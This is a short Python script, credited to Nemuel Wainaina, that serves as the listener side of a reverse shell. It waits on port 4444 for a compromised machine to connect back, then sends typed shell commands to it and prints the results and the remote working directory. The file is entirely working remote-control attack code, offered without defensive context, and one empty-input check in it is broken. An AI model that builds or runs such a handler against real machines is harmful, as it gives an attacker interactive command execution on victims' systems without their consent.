# Author : Nemuel Wainaina

import socket
from colorama import init, Fore

init()
GREEN = Fore.GREEN
GRAY = Fore.LIGHTBLACK_EX
RESET = Fore.RESET

IPADDR = "127.0.0.1"
PORT = 4444
BUFFER = 1024 * 128 # 128 kb
SEP = "<sep>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IPADDR, PORT))

s.listen()
print(f"{GRAY}[*] Listening for incoming connections ... {RESET}\n")

conn, addr = s.accept()
print(f"{GREEN}[+] Accepted connection from {addr[0]}:{addr[1]}\n{RESET}")

cwd = conn.recv(BUFFER).decode()

while True:
    cmd = input(f"{GREEN}{cwd} $ {RESET}")

    if cmd.split() == "":
        continue

    if cmd.lower() == "q":
        break

    conn.send(cmd.encode())

    msg = conn.recv(BUFFER).decode()
    result, cwd = msg.split(SEP)

    print(f"{result}\n")

conn.close()
s.close()
